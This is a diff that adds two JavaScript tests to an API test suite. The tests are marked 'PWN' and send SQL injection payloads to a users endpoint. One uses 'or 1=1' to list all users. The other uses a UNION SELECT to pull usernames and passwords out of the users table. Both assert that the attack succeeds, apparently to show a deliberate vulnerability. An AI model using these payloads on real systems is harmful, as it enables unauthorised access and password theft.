@@ -63,6 +63,28 @@ describe("Authenticated tests", function () {
       });
   });
 
+  it("PWN /api/users: SQL injection all users", function (done) {
+    chai.request(app)
+      .get("/api/users/type/2 or 1=1")
+      .set({ Authorization: `Bearer ${accessToken}` })
+      .end(function (err, res) {
+        res.should.have.status(200)
+        res.body.data.should.have.length(3)
+        done()
+      });
+  });
+
+  it("PWN /api/users: SQL injection extract user password", function (done) {
+    chai.request(app)
+      .get("/api/users/type/2 UNION SELECT 1,username || '-' || password,1,1 FROM users")
+      .set({ Authorization: `Bearer ${accessToken}` })
+      .end(function (err, res) {
+        res.should.have.status(200)
+        res.body.data[0].should.have.property("username").to.include("admin-123");
+        done()
+      });
+  });
+
   it("GET /api/messages: Show all messages", function (done) {
     chai.request(app)
       .get("/api/messages")
@@ -73,5 +95,7 @@ describe("Authenticated tests", function () {
         done()
       });
   });
+
+  
 
 });
